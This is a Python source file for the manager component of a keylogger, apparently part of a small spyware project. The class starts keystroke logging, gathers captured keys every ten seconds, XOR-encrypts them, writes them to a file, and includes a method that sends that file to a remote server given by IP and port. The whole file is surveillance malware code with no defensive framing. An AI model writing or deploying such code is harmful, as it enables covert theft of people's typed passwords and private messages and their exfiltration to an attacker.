import time
import threading
from KeyLoggerService import KeyLoggerService
import Writer
import Encryptor
import Network


class KeyLoggerManager:
    def __init__(self, server_ip, port, file_name, key):
        self.keylogger = KeyLoggerService()
        self.writer = Writer.FileWriter(file_name)
        self.encryptor = Encryptor.Encryptor(key)
        self.client = Network.Network(server_ip, key, port)
        self.running = False

    def collect_data(self):
        while self.running:
            time.sleep(10)
            data = ''.join(self.keylogger.get_logged_keys())
            # print(data + ' from 19')
            if data != '':
                encrypted_data = self.encryptor.xor_encrypt(data)
                # print(data + ' from 22')
                # print(encrypted_data)
                self.writer.write_to_file(encrypted_data)
                # self.client.send_data(self.writer.getFileName())
                self.keylogger.keys.clear()

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_data, daemon=True).start()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()

    def communicate(self, file_name):
        try:
            self.client.send_data(file_name)
        except ConnectionError as e:
            print(f"Connection Error: {e}")





